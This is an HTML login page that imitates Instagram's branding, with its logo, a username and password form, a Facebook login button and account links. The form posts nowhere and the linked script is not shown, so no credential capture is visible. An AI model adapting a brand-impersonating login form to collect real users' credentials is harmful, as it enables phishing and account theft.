<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link rel="stylesheet" href="styles.css">
  <script src="java.js" defer></script>
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <div class="login-box-left">
        <img src="instagram-logo-instagram-logo-transparent-instagram-icon-transparent-free-free-png.webp" alt="Instagram Logo" class="logo">
        <form action="#" method="post">
          <input type="text" name="username" placeholder="Phone number, email, or username" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="divider">OR</div>
        <button class="fb-login-btn">Log in with Facebook</button>
        <div class="forgot-password">
          <a href="#">Forgot password?</a>
        </div>
        <div class="delete-account">
          <a href="#">Delete our Instagram account</a>
        </div>
      </div>
      <div class="login-box-right">
        <div class="signup-container">
          <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
